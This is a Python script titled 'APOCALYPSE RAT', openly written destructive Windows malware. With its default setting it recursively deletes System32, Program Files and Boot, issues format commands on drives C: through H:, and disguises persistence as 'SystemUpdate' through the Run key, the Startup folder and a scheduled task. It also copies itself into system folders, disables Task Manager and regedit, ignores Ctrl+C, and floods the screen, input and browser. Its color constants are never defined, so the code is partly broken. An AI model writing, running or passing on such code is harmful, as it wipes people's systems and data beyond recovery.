#!/usr/bin/env python3
"""
APOCALYPSE RAT — ABSOLUTE NUCLEAR CHAOS
NO HOLDS BARRED. NO STOPPING. NO MERCY.

Run: python apocalypse_rat.py
"""

import os
import sys
import time
import random
import shutil
import threading
import subprocess
import webbrowser
import ctypes
import signal
import tempfile
import winreg
import psutil
from datetime import datetime

# ========== CONFIG ==========
NUCLEAR_MODE = True  # SET TRUE FOR SYSTEM DELETION (DANGER!)
TARGET_FOLDERS = ["C:\\Users\\Public\\TRASH"]  # Test folders
if NUCLEAR_MODE:
    TARGET_FOLDERS = [
        "C:\\Windows\\System32",
        "C:\\Windows\\SysWOW64",
        "C:\\Program Files",
        "C:\\Program Files (x86)",
        "C:\\Users\\Public\\Documents",
        "C:\\Boot",
    ]

# ========== IGNORE CTRL+C ==========
def ignore_sigint():
    signal.signal(signal.SIGINT, signal.SIG_IGN)

# ========== PERSISTENCE ==========
def install_persistence():
    try:
        # Add to startup folder
        startup = os.path.join(os.getenv('APPDATA'), 
                               r'Microsoft\Windows\Start Menu\Programs\Startup')
        link_path = os.path.join(startup, "SystemUpdate.lnk")
        # Create shortcut (requires winshell, fallback to copy)
        try:
            import winshell
            with winshell.shortcut(link_path) as shortcut:
                shortcut.path = sys.executable
                shortcut.arguments = f'"{os.path.abspath(__file__)}"'
                shortcut.working_directory = os.path.dirname(__file__)
                shortcut.save()
        except:
            # Fallback: copy script itself
            shutil.copy2(__file__, os.path.join(startup, "SystemUpdate.py"))
        
        # Add to Run registry
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ,
                          f'"{sys.executable}" "{os.path.abspath(__file__)}"')
        winreg.CloseKey(key)
        
        # Add to scheduled tasks
        try:
            subprocess.run([
                "schtasks", "/create", "/tn", "SystemUpdate",
                "/tr", f'"{sys.executable}" "{os.path.abspath(__file__)}"',
                "/sc", "onlogon", "/f"
            ], capture_output=True)
        except:
            pass
    except:
        pass

# ========== SELF-REPLICATE ==========
def self_replicate():
    target_paths = [
        os.path.join(os.getenv('TEMP'), "SystemUpdate.py"),
        os.path.join(os.getenv('WINDIR'), "SystemUpdate.py"),
        os.path.join(os.getenv('WINDIR'), "System32", "SystemUpdate.py"),
    ]
    for path in target_paths:
        try:
            shutil.copy2(__file__, path)
        except:
            pass

# ========== DELETE FUNCTION ==========
def delete_everything():
    global running
    while running:
        for folder in TARGET_FOLDERS:
            try:
                if os.path.exists(folder):
                    for root, dirs, files in os.walk(folder, topdown=False):
                        for file in files:
                            try:
                                os.remove(os.path.join(root, file))
                                print(f"{RED}💀 DELETED: {os.path.join(root, file)}{RESET}")
                            except:
                                pass
                        for dir in dirs:
                            try:
                                shutil.rmtree(os.path.join(root, dir), ignore_errors=True)
                                print(f"{RED}💀 DELETED FOLDER: {os.path.join(root, dir)}{RESET}")
                            except:
                                pass
                    # Try to delete the folder itself
                    shutil.rmtree(folder, ignore_errors=True)
            except:
                pass
        time.sleep(0.5)

# ========== FORMAT DRIVE (SIMULATED OR REAL) ==========
def format_drive():
    drives = ["C:", "D:", "E:", "F:", "G:", "H:"]
    while running:
        drive = random.choice(drives)
        try:
            print(f"{RED}💾 FORMATTING {drive} /Q /Y{RESET}")
            if NUCLEAR_MODE:
                subprocess.run(f"format {drive} /Q /Y", shell=True, capture_output=True)
            else:
                # Simulate
                for i in range(101):
                    if not running:
                        break
                    bar = '█' * (i // 2) + '░' * (50 - i // 2)
                    print(f"\r{BLUE}[{bar}] {i}%{RESET}", end='', flush=True)
                    time.sleep(0.01)
                print(f"\n{GREEN}✓ {drive} wiped (simulated){RESET}")
        except:
            pass
        time.sleep(1)

# ========== TERMINAL SPAM ==========
def terminal_spam():
    chars = "!@#$%^&*()_+{}|:<>?~`"
    while running:
        try:
            color = random.choice([RED, YELLOW, MAGENTA, CYAN])
            pattern = ''.join(random.choice(chars) for _ in range(random.randint(10, 50)))
            print(f"{color}{pattern}{RESET}", end='', flush=True)
            time.sleep(random.uniform(0.001, 0.01))
        except:
            pass

# ========== POPUP HELL ==========
def popup_hell():
    messages = [
        "🔥 SYSTEM DESTROYED",
        "💀 YOU CAN'T STOP ME",
        "☢️ NUCLEAR LAUNCH",
        "🚀 RAT ACTIVATED",
        "😈 MR. ROBOT SAYS HELLO",
        "⚠️ ALL DATA LOST",
        "👾 GAME OVER",
        "🌀 INFINITE CHAOS",
        "💣 BOOM!",
        "🌍 WORLD DELETED",
        "🛑 NO STOPPING",
        "🔥🔥🔥🔥🔥",
        "💀💀💀💀💀",
        "☢️☢️☢️☢️☢️",
    ]
    while running:
        try:
            ctypes.windll.user32.MessageBoxW(0, random.choice(messages), "APOCALYPSE", 0x10)
            time.sleep(random.uniform(0.1, 0.5))
        except:
            pass

# ========== SCREEN FLASH ==========
def screen_flash():
    while running:
        try:
            ctypes.windll.user32.InvalidateRect(0, None, True)
            time.sleep(0.01)
        except:
            pass

# ========== WEB SPAM ==========
def web_hell():
    sites = [
        "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
        "https://www.nyan.cat",
        "https://www.omfgdogs.com",
        "https://www.staggeringbeauty.com",
        "https://eelslap.com",
        "https://cant-not-tweet-this.com",
        "https://www.koalastothemax.com",
        "https://www.patience-is-a-virtue.org",
    ]
    while running:
        try:
            webbrowser.open(random.choice(sites))
            time.sleep(random.uniform(0.1, 0.5))
        except:
            pass

# ========== SOUND HELL ==========
def sound_hell():
    try:
        import winsound
        while running:
            winsound.Beep(random.randint(100, 2000), random.randint(50, 200))
            time.sleep(random.uniform(0.01, 0.05))
    except:
        pass

# ========== KEYBOARD/MOUSE SPAM ==========
def input_spam():
    while running:
        try:
            # Move mouse
            ctypes.windll.user32.SetCursorPos(random.randint(0, 2000), random.randint(0, 1200))
            # Press random keys
            key = random.randint(65, 90)  # A-Z
            ctypes.windll.user32.keybd_event(key, 0, 0, 0)
            ctypes.windll.user32.keybd_event(key, 0, 2, 0)
            time.sleep(random.uniform(0.01, 0.05))
        except:
            pass

# ========== NUKE VISUAL ==========
def nuke_visual():
    while running:
        try:
            if random.random() < 0.01:
                print("""
    💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥
    💥                                          💥
    💥     ☢️ NUCLEAR DETONATION DETECTED ☢️    💥
    💥                                          💥
    💥     ██████████████████████████████████   💥
    💥     ██████████████████████████████████   💥
    💥     ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██   💥
    💥     ██░░████████████████████████░░██   💥
    💥     ██░░██░░░░░░░░░░░░░░░░░░██░░██   💥
    💥     ██░░██░░████████████████░░██░░██   💥
    💥     ██░░██░░██░░░░░░░░░░██░░██░░██   💥
    💥     ██░░██░░██░░████████░░██░░██░░██   💥
    💥     ██████████████████████████████████   💥
    💥                                          💥
    💥     ☢️ RADIATION LEVEL: OVER 9000 ☢️     💥
    💥                                          💥
    💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥
                """)
                time.sleep(2)
        except:
            pass

# ========== LOCK SYSTEM (SIMULATED) ==========
def lock_system():
    while running:
        try:
            # Try to disable task manager (registry)
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            
            # Try to disable regedit
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            
            # Block Ctrl+Alt+Del (simulated)
            # Not easily done, but we can add a message
            print(f"{RED}🔒 SYSTEM LOCKED{RESET}")
            time.sleep(10)
        except:
            pass
        time.sleep(60)

# ========== WATCHDOG ==========
def watchdog():
    global running, threads
    while running:
        # Check if threads are alive, restart dead ones
        # We'll just restart everything if any die
        # But we'll keep it simple: if running is True, keep spawning
        # We'll use a separate mechanism to ensure threads never stop
        time.sleep(2)

# ========== MAIN ==========
running = True
threads = []

def main():
    global running, threads
    
    # Ignore Ctrl+C
    ignore_sigint()
    
    # Install persistence
    install_persistence()
    self_replicate()
    
    # Banner
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{BOLD}{RED}╔══════════════════════════════════════════════════════════╗
║                                                          ║
║   █████╗ ██████╗  ██████╗  █████╗ ██╗  ██╗██████╗      ║
║  ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██║  ██║██╔══██╗     ║
║  ███████║██████╔╝██║   ██║███████║███████║██║  ██║     ║
║  ██╔══██║██╔═══╝ ██║   ██║██╔══██║██╔══██║██║  ██║     ║
║  ██║  ██║██║     ╚██████╔╝██║  ██║██║  ██║██████╔╝     ║
║  ╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝      ║
║                                                          ║
║         {RESET}APOCALYPSE RAT — NO HOLD BACK{RED}                 ║
║         {RESET}☢️ NUCLEAR MODE: {'ACTIVE' if NUCLEAR_MODE else 'SAFE'} ☢️{RED}      ║
╚══════════════════════════════════════════════════════════╝{RESET}
    """)
    
    if NUCLEAR_MODE:
        print(f"{RED}⚠️  ⚠️  ⚠️  NUCLEAR MODE ENGAGED  ⚠️  ⚠️  ⚠️{RESET}")
        print(f"{RED}THIS WILL DELETE SYSTEM FILES. YOUR PC WILL BE DESTROYED.{RESET}")
        print(f"{RED}NO STOPPING. NO MERCY. GOODBYE.{RESET}\n")
        time.sleep(3)
    else:
        print(f"{YELLOW}[!] SAFE MODE: Deleting only test folders in C:\\Users\\Public\\TRASH{RESET}")
        print(f"{YELLOW}[!] To unleash full destruction, set NUCLEAR_MODE = True{RESET}\n")
        time.sleep(2)
    
    # Create test folders if safe
    if not NUCLEAR_MODE:
        for folder in TARGET_FOLDERS:
            if not os.path.exists(folder):
                os.makedirs(folder)
                for i in range(50):
                    with open(os.path.join(folder, f"file_{i}.txt"), 'w') as f:
                        f.write("DELETE ME" * 200)
    
    # Launch threads (all of them)
    funcs = [
        delete_everything,
        format_drive,
        terminal_spam,
        popup_hell,
        screen_flash,
        web_hell,
        sound_hell,
        input_spam,
        nuke_visual,
        lock_system,
    ]
    
    for func in funcs:
        t = threading.Thread(target=func, daemon=True)
        t.start()
        threads.append(t)
    
    # Watchdog thread (restart if any die)
    def watchdog():
        while running:
            # Check if any thread is dead and restart it
            for i, t in enumerate(threads):
                if not t.is_alive():
                    try:
                        new_t = threading.Thread(target=funcs[i], daemon=True)
                        new_t.start()
                        threads[i] = new_t
                        print(f"{YELLOW}[+] Restarted thread: {funcs[i].__name__}{RESET}")
                    except:
                        pass
            time.sleep(1)
    
    wd = threading.Thread(target=watchdog, daemon=True)
    wd.start()
    
    print(f"{MAGENTA}🔥🔥🔥 APOCALYPSE RAT ACTIVATED 🔥🔥🔥{RESET}")
    print(f"{CYAN}Press F12 to stop (if you can find the keyboard).{RESET}")
    
    # Main loop - listen for F12 to stop
    try:
        while running:
            # Check for F12
            if ctypes.windll.user32.GetAsyncKeyState(123) & 0x8000:  # F12
                running = False
                break
            time.sleep(0.1)
    except:
        pass
    
    # Cleanup (not really, just exit)
    print(f"\n{RED}💀 APOCALYPSE RAT TERMINATED (BY F12){RESET}")
    print(f"{GREEN}You survived. The system may not.{RESET}")
    sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[-] Error: {e}")
        # Keep running
        while True:
            time.sleep(1)